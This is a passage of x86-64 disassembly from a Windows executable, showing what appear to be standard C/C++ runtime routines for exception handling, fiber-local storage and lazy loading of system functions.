   140003b14:	48 83 c2 09          	add    $0x9,%rdx
   140003b18:	48 83 c1 09          	add    $0x9,%rcx
   140003b1c:	e9 af e0 00 00       	jmp    0x140011bd0
   140003b21:	cc                   	int3
   140003b22:	cc                   	int3
   140003b23:	cc                   	int3
   140003b24:	48 85 c9             	test   %rcx,%rcx
   140003b27:	74 6e                	je     0x140003b97
   140003b29:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140003b2d:	48 83 ec 48          	sub    $0x48,%rsp
   140003b31:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140003b37:	75 5a                	jne    0x140003b93
   140003b39:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140003b3d:	75 54                	jne    0x140003b93
   140003b3f:	8b 41 20             	mov    0x20(%rcx),%eax
   140003b42:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140003b47:	74 0a                	je     0x140003b53
   140003b49:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140003b4e:	83 f8 01             	cmp    $0x1,%eax
   140003b51:	77 40                	ja     0x140003b93
   140003b53:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140003b57:	48 85 c0             	test   %rax,%rax
   140003b5a:	74 37                	je     0x140003b93
   140003b5c:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003b60:	85 d2                	test   %edx,%edx
   140003b62:	74 11                	je     0x140003b75
   140003b64:	48 03 51 38          	add    0x38(%rcx),%rdx
   140003b68:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140003b6c:	e8 27 00 00 00       	call   0x140003b98
   140003b71:	eb 20                	jmp    0x140003b93
   140003b73:	eb 1e                	jmp    0x140003b93
   140003b75:	f6 00 10             	testb  $0x10,(%rax)
   140003b78:	74 19                	je     0x140003b93
   140003b7a:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140003b7e:	48 8b 08             	mov    (%rax),%rcx
   140003b81:	48 85 c9             	test   %rcx,%rcx
   140003b84:	74 0d                	je     0x140003b93
   140003b86:	48 8b 01             	mov    (%rcx),%rax
   140003b89:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003b8d:	ff 15 d5 f7 00 00    	call   *0xf7d5(%rip)        # 0x140013368
   140003b93:	48 83 c4 48          	add    $0x48,%rsp
   140003b97:	c3                   	ret
   140003b98:	48 ff e2             	rex.W jmp *%rdx
   140003b9b:	cc                   	int3
   140003b9c:	40 53                	rex push %rbx
   140003b9e:	48 83 ec 20          	sub    $0x20,%rsp
   140003ba2:	48 8b d9             	mov    %rcx,%rbx
   140003ba5:	e8 a2 01 00 00       	call   0x140003d4c
   140003baa:	48 8b 50 58          	mov    0x58(%rax),%rdx
   140003bae:	eb 09                	jmp    0x140003bb9
   140003bb0:	48 39 1a             	cmp    %rbx,(%rdx)
   140003bb3:	74 12                	je     0x140003bc7
   140003bb5:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140003bb9:	48 85 d2             	test   %rdx,%rdx
   140003bbc:	75 f2                	jne    0x140003bb0
   140003bbe:	8d 42 01             	lea    0x1(%rdx),%eax
   140003bc1:	48 83 c4 20          	add    $0x20,%rsp
   140003bc5:	5b                   	pop    %rbx
   140003bc6:	c3                   	ret
   140003bc7:	33 c0                	xor    %eax,%eax
   140003bc9:	eb f6                	jmp    0x140003bc1
   140003bcb:	cc                   	int3
   140003bcc:	48 63 02             	movslq (%rdx),%rax
   140003bcf:	48 03 c1             	add    %rcx,%rax
   140003bd2:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140003bd6:	7c 16                	jl     0x140003bee
   140003bd8:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140003bdc:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   140003be0:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   140003be4:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   140003be8:	4d 03 c1             	add    %r9,%r8
   140003beb:	49 03 c0             	add    %r8,%rax
   140003bee:	c3                   	ret
   140003bef:	cc                   	int3
   140003bf0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003bf5:	57                   	push   %rdi
   140003bf6:	48 83 ec 20          	sub    $0x20,%rsp
   140003bfa:	48 8b 39             	mov    (%rcx),%rdi
   140003bfd:	48 8b d9             	mov    %rcx,%rbx
   140003c00:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   140003c06:	74 12                	je     0x140003c1a
   140003c08:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   140003c0e:	74 0a                	je     0x140003c1a
   140003c10:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003c16:	74 22                	je     0x140003c3a
   140003c18:	eb 13                	jmp    0x140003c2d
   140003c1a:	e8 2d 01 00 00       	call   0x140003d4c
   140003c1f:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   140003c23:	7e 08                	jle    0x140003c2d
   140003c25:	e8 22 01 00 00       	call   0x140003d4c
   140003c2a:	ff 48 30             	decl   0x30(%rax)
   140003c2d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c32:	33 c0                	xor    %eax,%eax
   140003c34:	48 83 c4 20          	add    $0x20,%rsp
   140003c38:	5f                   	pop    %rdi
   140003c39:	c3                   	ret
   140003c3a:	e8 0d 01 00 00       	call   0x140003d4c
   140003c3f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003c43:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140003c47:	e8 00 01 00 00       	call   0x140003d4c
   140003c4c:	48 89 58 28          	mov    %rbx,0x28(%rax)
   140003c50:	e8 5b 3a 00 00       	call   0x1400076b0
   140003c55:	cc                   	int3
   140003c56:	cc                   	int3
   140003c57:	cc                   	int3
   140003c58:	48 83 ec 28          	sub    $0x28,%rsp
   140003c5c:	e8 eb 00 00 00       	call   0x140003d4c
   140003c61:	48 83 c0 20          	add    $0x20,%rax
   140003c65:	48 83 c4 28          	add    $0x28,%rsp
   140003c69:	c3                   	ret
   140003c6a:	cc                   	int3
   140003c6b:	cc                   	int3
   140003c6c:	48 83 ec 28          	sub    $0x28,%rsp
   140003c70:	e8 d7 00 00 00       	call   0x140003d4c
   140003c75:	48 83 c0 28          	add    $0x28,%rax
   140003c79:	48 83 c4 28          	add    $0x28,%rsp
   140003c7d:	c3                   	ret
   140003c7e:	cc                   	int3
   140003c7f:	cc                   	int3
   140003c80:	48 83 ec 28          	sub    $0x28,%rsp
   140003c84:	e8 27 3a 00 00       	call   0x1400076b0
   140003c89:	cc                   	int3
   140003c8a:	cc                   	int3
   140003c8b:	cc                   	int3
   140003c8c:	cc                   	int3
   140003c8d:	cc                   	int3
   140003c8e:	cc                   	int3
   140003c8f:	cc                   	int3
   140003c90:	cc                   	int3
   140003c91:	cc                   	int3
   140003c92:	cc                   	int3
   140003c93:	cc                   	int3
   140003c94:	cc                   	int3
   140003c95:	cc                   	int3
   140003c96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003c9d:	00 00 00 
   140003ca0:	cc                   	int3
   140003ca1:	cc                   	int3
   140003ca2:	cc                   	int3
   140003ca3:	cc                   	int3
   140003ca4:	cc                   	int3
   140003ca5:	cc                   	int3
   140003ca6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003cad:	00 00 00 
   140003cb0:	cc                   	int3
   140003cb1:	cc                   	int3
   140003cb2:	cc                   	int3
   140003cb3:	cc                   	int3
   140003cb4:	cc                   	int3
   140003cb5:	cc                   	int3
   140003cb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003cbd:	00 00 00 
   140003cc0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003cc5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140003cca:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140003ccf:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140003cd6:	e9 05 00 00 00       	jmp    0x140003ce0
   140003cdb:	cc                   	int3
   140003cdc:	cc                   	int3
   140003cdd:	cc                   	int3
   140003cde:	cc                   	int3
   140003cdf:	cc                   	int3
   140003ce0:	c3                   	ret
   140003ce1:	cc                   	int3
   140003ce2:	cc                   	int3
   140003ce3:	cc                   	int3
   140003ce4:	cc                   	int3
   140003ce5:	cc                   	int3
   140003ce6:	cc                   	int3
   140003ce7:	cc                   	int3
   140003ce8:	cc                   	int3
   140003ce9:	cc                   	int3
   140003cea:	cc                   	int3
   140003ceb:	cc                   	int3
   140003cec:	cc                   	int3
   140003ced:	cc                   	int3
   140003cee:	cc                   	int3
   140003cef:	cc                   	int3
   140003cf0:	c3                   	ret
   140003cf1:	cc                   	int3
   140003cf2:	cc                   	int3
   140003cf3:	cc                   	int3
   140003cf4:	48 8b 05 5d f6 00 00 	mov    0xf65d(%rip),%rax        # 0x140013358
   140003cfb:	48 8d 15 de f5 ff ff 	lea    -0xa22(%rip),%rdx        # 0x1400032e0
   140003d02:	48 3b c2             	cmp    %rdx,%rax
   140003d05:	74 23                	je     0x140003d2a
   140003d07:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140003d0e:	00 00 
   140003d10:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140003d17:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140003d1b:	72 06                	jb     0x140003d23
   140003d1d:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140003d21:	76 07                	jbe    0x140003d2a
   140003d23:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140003d28:	cd 29                	int    $0x29
   140003d2a:	c3                   	ret
   140003d2b:	cc                   	int3
   140003d2c:	48 83 ec 28          	sub    $0x28,%rsp
   140003d30:	48 85 c9             	test   %rcx,%rcx
   140003d33:	74 11                	je     0x140003d46
   140003d35:	48 8d 05 54 ae 01 00 	lea    0x1ae54(%rip),%rax        # 0x14001eb90
   140003d3c:	48 3b c8             	cmp    %rax,%rcx
   140003d3f:	74 05                	je     0x140003d46
   140003d41:	e8 8a 39 00 00       	call   0x1400076d0
   140003d46:	48 83 c4 28          	add    $0x28,%rsp
   140003d4a:	c3                   	ret
   140003d4b:	cc                   	int3
   140003d4c:	48 83 ec 28          	sub    $0x28,%rsp
   140003d50:	e8 13 00 00 00       	call   0x140003d68
   140003d55:	48 85 c0             	test   %rax,%rax
   140003d58:	74 05                	je     0x140003d5f
   140003d5a:	48 83 c4 28          	add    $0x28,%rsp
   140003d5e:	c3                   	ret
   140003d5f:	e8 0c 3a 00 00       	call   0x140007770
   140003d64:	cc                   	int3
   140003d65:	cc                   	int3
   140003d66:	cc                   	int3
   140003d67:	cc                   	int3
   140003d68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003d6d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003d72:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003d77:	57                   	push   %rdi
   140003d78:	48 83 ec 20          	sub    $0x20,%rsp
   140003d7c:	83 3d 0d a3 01 00 ff 	cmpl   $0xffffffff,0x1a30d(%rip)        # 0x14001e090
   140003d83:	75 07                	jne    0x140003d8c
   140003d85:	33 c0                	xor    %eax,%eax
   140003d87:	e9 90 00 00 00       	jmp    0x140003e1c
   140003d8c:	ff 15 fe f3 00 00    	call   *0xf3fe(%rip)        # 0x140013190
   140003d92:	8b 0d f8 a2 01 00    	mov    0x1a2f8(%rip),%ecx        # 0x14001e090
   140003d98:	8b f8                	mov    %eax,%edi
   140003d9a:	e8 65 03 00 00       	call   0x140004104
   140003d9f:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003da3:	33 f6                	xor    %esi,%esi
   140003da5:	48 3b c2             	cmp    %rdx,%rax
   140003da8:	74 67                	je     0x140003e11
   140003daa:	48 85 c0             	test   %rax,%rax
   140003dad:	74 05                	je     0x140003db4
   140003daf:	48 8b f0             	mov    %rax,%rsi
   140003db2:	eb 5d                	jmp    0x140003e11
   140003db4:	8b 0d d6 a2 01 00    	mov    0x1a2d6(%rip),%ecx        # 0x14001e090
   140003dba:	e8 8d 03 00 00       	call   0x14000414c
   140003dbf:	85 c0                	test   %eax,%eax
   140003dc1:	74 4e                	je     0x140003e11
   140003dc3:	ba 80 00 00 00       	mov    $0x80,%edx
   140003dc8:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140003dcb:	e8 00 3a 00 00       	call   0x1400077d0
   140003dd0:	8b 0d ba a2 01 00    	mov    0x1a2ba(%rip),%ecx        # 0x14001e090
   140003dd6:	48 8b e8             	mov    %rax,%rbp
   140003dd9:	48 8b d8             	mov    %rax,%rbx
   140003ddc:	48 85 c0             	test   %rax,%rax
   140003ddf:	74 21                	je     0x140003e02
   140003de1:	48 8b d0             	mov    %rax,%rdx
   140003de4:	e8 63 03 00 00       	call   0x14000414c
   140003de9:	85 c0                	test   %eax,%eax
   140003deb:	74 0f                	je     0x140003dfc
   140003ded:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140003df4:	48 8b de             	mov    %rsi,%rbx
   140003df7:	48 8b f5             	mov    %rbp,%rsi
   140003dfa:	eb 0d                	jmp    0x140003e09
   140003dfc:	8b 0d 8e a2 01 00    	mov    0x1a28e(%rip),%ecx        # 0x14001e090
   140003e02:	33 d2                	xor    %edx,%edx
   140003e04:	e8 43 03 00 00       	call   0x14000414c
   140003e09:	48 8b cb             	mov    %rbx,%rcx
   140003e0c:	e8 bf 38 00 00       	call   0x1400076d0
   140003e11:	8b cf                	mov    %edi,%ecx
   140003e13:	ff 15 7f f3 00 00    	call   *0xf37f(%rip)        # 0x140013198
   140003e19:	48 8b c6             	mov    %rsi,%rax
   140003e1c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e21:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003e26:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003e2b:	48 83 c4 20          	add    $0x20,%rsp
   140003e2f:	5f                   	pop    %rdi
   140003e30:	c3                   	ret
   140003e31:	cc                   	int3
   140003e32:	cc                   	int3
   140003e33:	cc                   	int3
   140003e34:	48 83 ec 28          	sub    $0x28,%rsp
   140003e38:	48 8d 0d ed fe ff ff 	lea    -0x113(%rip),%rcx        # 0x140003d2c
   140003e3f:	e8 30 02 00 00       	call   0x140004074
   140003e44:	89 05 46 a2 01 00    	mov    %eax,0x1a246(%rip)        # 0x14001e090
   140003e4a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003e4d:	74 25                	je     0x140003e74
   140003e4f:	48 8d 15 3a ad 01 00 	lea    0x1ad3a(%rip),%rdx        # 0x14001eb90
   140003e56:	8b c8                	mov    %eax,%ecx
   140003e58:	e8 ef 02 00 00       	call   0x14000414c
   140003e5d:	85 c0                	test   %eax,%eax
   140003e5f:	74 0e                	je     0x140003e6f
   140003e61:	c7 05 9d ad 01 00 fe 	movl   $0xfffffffe,0x1ad9d(%rip)        # 0x14001ec08
   140003e68:	ff ff ff 
   140003e6b:	b0 01                	mov    $0x1,%al
   140003e6d:	eb 07                	jmp    0x140003e76
   140003e6f:	e8 08 00 00 00       	call   0x140003e7c
   140003e74:	32 c0                	xor    %al,%al
   140003e76:	48 83 c4 28          	add    $0x28,%rsp
   140003e7a:	c3                   	ret
   140003e7b:	cc                   	int3
   140003e7c:	48 83 ec 28          	sub    $0x28,%rsp
   140003e80:	8b 0d 0a a2 01 00    	mov    0x1a20a(%rip),%ecx        # 0x14001e090
   140003e86:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003e89:	74 0f                	je     0x140003e9a
   140003e8b:	e8 2c 02 00 00       	call   0x1400040bc
   140003e90:	c7 05 f6 a1 01 00 ff 	movl   $0xffffffff,0x1a1f6(%rip)        # 0x14001e090
   140003e97:	ff ff ff 
   140003e9a:	b0 01                	mov    $0x1,%al
   140003e9c:	48 83 c4 28          	add    $0x28,%rsp
   140003ea0:	c3                   	ret
   140003ea1:	cc                   	int3
   140003ea2:	cc                   	int3
   140003ea3:	cc                   	int3
   140003ea4:	40 53                	rex push %rbx
   140003ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140003eaa:	33 db                	xor    %ebx,%ebx
   140003eac:	48 8d 15 5d ad 01 00 	lea    0x1ad5d(%rip),%rdx        # 0x14001ec10
   140003eb3:	45 33 c0             	xor    %r8d,%r8d
   140003eb6:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140003eba:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140003ebe:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140003ec3:	e8 d8 02 00 00       	call   0x1400041a0
   140003ec8:	85 c0                	test   %eax,%eax
   140003eca:	74 11                	je     0x140003edd
   140003ecc:	ff 05 66 ad 01 00    	incl   0x1ad66(%rip)        # 0x14001ec38
   140003ed2:	ff c3                	inc    %ebx
   140003ed4:	83 fb 01             	cmp    $0x1,%ebx
   140003ed7:	72 d3                	jb     0x140003eac
   140003ed9:	b0 01                	mov    $0x1,%al
   140003edb:	eb 07                	jmp    0x140003ee4
   140003edd:	e8 0a 00 00 00       	call   0x140003eec
   140003ee2:	32 c0                	xor    %al,%al
   140003ee4:	48 83 c4 20          	add    $0x20,%rsp
   140003ee8:	5b                   	pop    %rbx
   140003ee9:	c3                   	ret
   140003eea:	cc                   	int3
   140003eeb:	cc                   	int3
   140003eec:	40 53                	rex push %rbx
   140003eee:	48 83 ec 20          	sub    $0x20,%rsp
   140003ef2:	8b 1d 40 ad 01 00    	mov    0x1ad40(%rip),%ebx        # 0x14001ec38
   140003ef8:	eb 1d                	jmp    0x140003f17
   140003efa:	48 8d 05 0f ad 01 00 	lea    0x1ad0f(%rip),%rax        # 0x14001ec10
   140003f01:	ff cb                	dec    %ebx
   140003f03:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140003f07:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140003f0b:	ff 15 9f f2 00 00    	call   *0xf29f(%rip)        # 0x1400131b0
   140003f11:	ff 0d 21 ad 01 00    	decl   0x1ad21(%rip)        # 0x14001ec38
   140003f17:	85 db                	test   %ebx,%ebx
   140003f19:	75 df                	jne    0x140003efa
   140003f1b:	b0 01                	mov    $0x1,%al
   140003f1d:	48 83 c4 20          	add    $0x20,%rsp
   140003f21:	5b                   	pop    %rbx
   140003f22:	c3                   	ret
   140003f23:	cc                   	int3
   140003f24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003f29:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003f2e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003f33:	57                   	push   %rdi
   140003f34:	41 54                	push   %r12
   140003f36:	41 55                	push   %r13
   140003f38:	41 56                	push   %r14
   140003f3a:	41 57                	push   %r15
   140003f3c:	48 83 ec 20          	sub    $0x20,%rsp
   140003f40:	8b f9                	mov    %ecx,%edi
   140003f42:	4c 8d 3d b7 c0 ff ff 	lea    -0x3f49(%rip),%r15        # 0x140000000
   140003f49:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140003f4d:	4d 8b e1             	mov    %r9,%r12
   140003f50:	49 8b e8             	mov    %r8,%rbp
   140003f53:	4c 8b ea             	mov    %rdx,%r13
   140003f56:	49 8b 84 ff 58 ec 01 	mov    0x1ec58(%r15,%rdi,8),%rax
   140003f5d:	00 
   140003f5e:	90                   	nop
   140003f5f:	49 3b c6             	cmp    %r14,%rax
   140003f62:	0f 84 ae 00 00 00    	je     0x140004016
   140003f68:	48 85 c0             	test   %rax,%rax
   140003f6b:	0f 85 a7 00 00 00    	jne    0x140004018
   140003f71:	4d 3b c1             	cmp    %r9,%r8
   140003f74:	0f 84 94 00 00 00    	je     0x14000400e
   140003f7a:	8b 75 00             	mov    0x0(%rbp),%esi
   140003f7d:	49 8b 9c f7 40 ec 01 	mov    0x1ec40(%r15,%rsi,8),%rbx
   140003f84:	00 
   140003f85:	90                   	nop
   140003f86:	48 85 db             	test   %rbx,%rbx
   140003f89:	74 0b                	je     0x140003f96
   140003f8b:	49 3b de             	cmp    %r14,%rbx
   140003f8e:	0f 85 c1 00 00 00    	jne    0x140004055
   140003f94:	eb 6b                	jmp    0x140004001
   140003f96:	4d 8b bc f7 c8 43 01 	mov    0x143c8(%r15,%rsi,8),%r15
   140003f9d:	00 
   140003f9e:	33 d2                	xor    %edx,%edx
   140003fa0:	49 8b cf             	mov    %r15,%rcx
   140003fa3:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140003fa9:	ff 15 31 f2 00 00    	call   *0xf231(%rip)        # 0x1400131e0
   140003faf:	48 8b d8             	mov    %rax,%rbx
   140003fb2:	48 85 c0             	test   %rax,%rax
   140003fb5:	75 7e                	jne    0x140004035
   140003fb7:	ff 15 d3 f1 00 00    	call   *0xf1d3(%rip)        # 0x140013190
   140003fbd:	83 f8 57             	cmp    $0x57,%eax
   140003fc0:	75 2d                	jne    0x140003fef
   140003fc2:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140003fc6:	49 8b cf             	mov    %r15,%rcx
   140003fc9:	48 8d 15 a8 04 01 00 	lea    0x104a8(%rip),%rdx        # 0x140014478
   140003fd0:	e8 fb 38 00 00       	call   0x1400078d0
   140003fd5:	85 c0                	test   %eax,%eax
   140003fd7:	74 16                	je     0x140003fef
   140003fd9:	45 33 c0             	xor    %r8d,%r8d
   140003fdc:	33 d2                	xor    %edx,%edx
   140003fde:	49 8b cf             	mov    %r15,%rcx
   140003fe1:	ff 15 f9 f1 00 00    	call   *0xf1f9(%rip)        # 0x1400131e0
   140003fe7:	48 8b d8             	mov    %rax,%rbx
   140003fea:	48 85 c0             	test   %rax,%rax
   140003fed:	75 46                	jne    0x140004035
   140003fef:	49 8b c6             	mov    %r14,%rax
   140003ff2:	4c 8d 3d 07 c0 ff ff 	lea    -0x3ff9(%rip),%r15        # 0x140000000
   140003ff9:	49 87 84 f7 40 ec 01 	xchg   %rax,0x1ec40(%r15,%rsi,8)
   140004000:	00 
   140004001:	48 83 c5 04          	add    $0x4,%rbp
   140004005:	49 3b ec             	cmp    %r12,%rbp
   140004008:	0f 85 6c ff ff ff    	jne    0x140003f7a
   14000400e:	4d 87 b4 ff 58 ec 01 	xchg   %r14,0x1ec58(%r15,%rdi,8)
   140004015:	00 
   140004016:	33 c0                	xor    %eax,%eax
   140004018:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000401d:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004022:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004027:	48 83 c4 20          	add    $0x20,%rsp
   14000402b:	41 5f                	pop    %r15
   14000402d:	41 5e                	pop    %r14
   14000402f:	41 5d                	pop    %r13
   140004031:	41 5c                	pop    %r12
   140004033:	5f                   	pop    %rdi
   140004034:	c3                   	ret
   140004035:	48 8b c3             	mov    %rbx,%rax
   140004038:	4c 8d 3d c1 bf ff ff 	lea    -0x403f(%rip),%r15        # 0x140000000
   14000403f:	49 87 84 f7 40 ec 01 	xchg   %rax,0x1ec40(%r15,%rsi,8)
   140004046:	00 
   140004047:	48 85 c0             	test   %rax,%rax
   14000404a:	74 09                	je     0x140004055
   14000404c:	48 8b cb             	mov    %rbx,%rcx
   14000404f:	ff 15 2b f0 00 00    	call   *0xf02b(%rip)        # 0x140013080
   140004055:	49 8b d5             	mov    %r13,%rdx
   140004058:	48 8b cb             	mov    %rbx,%rcx
   14000405b:	ff 15 37 f0 00 00    	call   *0xf037(%rip)        # 0x140013098
   140004061:	48 85 c0             	test   %rax,%rax
   140004064:	74 a8                	je     0x14000400e
   140004066:	48 8b c8             	mov    %rax,%rcx
   140004069:	49 87 8c ff 58 ec 01 	xchg   %rcx,0x1ec58(%r15,%rdi,8)
   140004070:	00 
   140004071:	eb a5                	jmp    0x140004018
   140004073:	cc                   	int3
   140004074:	40 53                	rex push %rbx
   140004076:	48 83 ec 20          	sub    $0x20,%rsp
   14000407a:	48 8b d9             	mov    %rcx,%rbx
   14000407d:	4c 8d 0d 0c 04 01 00 	lea    0x1040c(%rip),%r9        # 0x140014490
   140004084:	33 c9                	xor    %ecx,%ecx
   140004086:	4c 8d 05 fb 03 01 00 	lea    0x103fb(%rip),%r8        # 0x140014488
   14000408d:	48 8d 15 fc 03 01 00 	lea    0x103fc(%rip),%rdx        # 0x140014490
   140004094:	e8 8b fe ff ff       	call   0x140003f24
   140004099:	48 85 c0             	test   %rax,%rax
   14000409c:	74 0f                	je     0x1400040ad
   14000409e:	48 8b cb             	mov    %rbx,%rcx
   1400040a1:	48 83 c4 20          	add    $0x20,%rsp
   1400040a5:	5b                   	pop    %rbx
   1400040a6:	48 ff 25 bb f2 00 00 	rex.W jmp *0xf2bb(%rip)        # 0x140013368
   1400040ad:	48 83 c4 20          	add    $0x20,%rsp
   1400040b1:	5b                   	pop    %rbx
   1400040b2:	48 ff 25 07 f1 00 00 	rex.W jmp *0xf107(%rip)        # 0x1400131c0
   1400040b9:	cc                   	int3
   1400040ba:	cc                   	int3
   1400040bb:	cc                   	int3
   1400040bc:	40 53                	rex push %rbx
   1400040be:	48 83 ec 20          	sub    $0x20,%rsp
   1400040c2:	8b d9                	mov    %ecx,%ebx
   1400040c4:	4c 8d 0d dd 03 01 00 	lea    0x103dd(%rip),%r9        # 0x1400144a8
   1400040cb:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400040d0:	4c 8d 05 c9 03 01 00 	lea    0x103c9(%rip),%r8        # 0x1400144a0
   1400040d7:	48 8d 15 ca 03 01 00 	lea    0x103ca(%rip),%rdx        # 0x1400144a8
   1400040de:	e8 41 fe ff ff       	call   0x140003f24
   1400040e3:	8b cb                	mov    %ebx,%ecx
   1400040e5:	48 85 c0             	test   %rax,%rax
   1400040e8:	74 0c                	je     0x1400040f6
   1400040ea:	48 83 c4 20          	add    $0x20,%rsp
   1400040ee:	5b                   	pop    %rbx
   1400040ef:	48 ff 25 72 f2 00 00 	rex.W jmp *0xf272(%rip)        # 0x140013368
   1400040f6:	48 83 c4 20          	add    $0x20,%rsp
   1400040fa:	5b                   	pop    %rbx
   1400040fb:	48 ff 25 d6 f0 00 00 	rex.W jmp *0xf0d6(%rip)        # 0x1400131d8
   140004102:	cc                   	int3
   140004103:	cc                   	int3
   140004104:	40 53                	rex push %rbx
   140004106:	48 83 ec 20          	sub    $0x20,%rsp
   14000410a:	8b d9                	mov    %ecx,%ebx
   14000410c:	4c 8d 0d a5 03 01 00 	lea    0x103a5(%rip),%r9        # 0x1400144b8
   140004113:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004118:	4c 8d 05 91 03 01 00 	lea    0x10391(%rip),%r8        # 0x1400144b0
   14000411f:	48 8d 15 92 03 01 00 	lea    0x10392(%rip),%rdx        # 0x1400144b8
   140004126:	e8 f9 fd ff ff       	call   0x140003f24
   14000412b:	8b cb                	mov    %ebx,%ecx
   14000412d:	48 85 c0             	test   %rax,%rax
   140004130:	74 0c                	je     0x14000413e
   140004132:	48 83 c4 20          	add    $0x20,%rsp
   140004136:	5b                   	pop    %rbx
   140004137:	48 ff 25 2a f2 00 00 	rex.W jmp *0xf22a(%rip)        # 0x140013368
   14000413e:	48 83 c4 20          	add    $0x20,%rsp
   140004142:	5b                   	pop    %rbx
   140004143:	48 ff 25 7e f0 00 00 	rex.W jmp *0xf07e(%rip)        # 0x1400131c8
   14000414a:	cc                   	int3
   14000414b:	cc                   	int3
   14000414c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004151:	57                   	push   %rdi
   140004152:	48 83 ec 20          	sub    $0x20,%rsp
   140004156:	48 8b da             	mov    %rdx,%rbx
   140004159:	4c 8d 0d 70 03 01 00 	lea    0x10370(%rip),%r9        # 0x1400144d0
   140004160:	8b f9                	mov    %ecx,%edi
   140004162:	48 8d 15 67 03 01 00 	lea    0x10367(%rip),%rdx        # 0x1400144d0
   140004169:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000416e:	4c 8d 05 53 03 01 00 	lea    0x10353(%rip),%r8        # 0x1400144c8
   140004175:	e8 aa fd ff ff       	call   0x140003f24
   14000417a:	48 8b d3             	mov    %rbx,%rdx
   14000417d:	8b cf                	mov    %edi,%ecx
   14000417f:	48 85 c0             	test   %rax,%rax
   140004182:	74 08                	je     0x14000418c
   140004184:	ff 15 de f1 00 00    	call   *0xf1de(%rip)        # 0x140013368
   14000418a:	eb 06                	jmp    0x140004192
   14000418c:	ff 15 3e f0 00 00    	call   *0xf03e(%rip)        # 0x1400131d0
   140004192:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004197:	48 83 c4 20          	add    $0x20,%rsp
   14000419b:	5f                   	pop    %rdi
   14000419c:	c3                   	ret
   14000419d:	cc                   	int3
   14000419e:	cc                   	int3
   14000419f:	cc                   	int3
   1400041a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400041aa:	57                   	push   %rdi
   1400041ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400041af:	41 8b f0             	mov    %r8d,%esi
   1400041b2:	4c 8d 0d 2f 03 01 00 	lea    0x1032f(%rip),%r9        # 0x1400144e8
   1400041b9:	8b da                	mov    %edx,%ebx
   1400041bb:	4c 8d 05 1e 03 01 00 	lea    0x1031e(%rip),%r8        # 0x1400144e0
   1400041c2:	48 8b f9             	mov    %rcx,%rdi
   1400041c5:	48 8d 15 1c 03 01 00 	lea    0x1031c(%rip),%rdx        # 0x1400144e8
   1400041cc:	b9 04 00 00 00       	mov    $0x4,%ecx
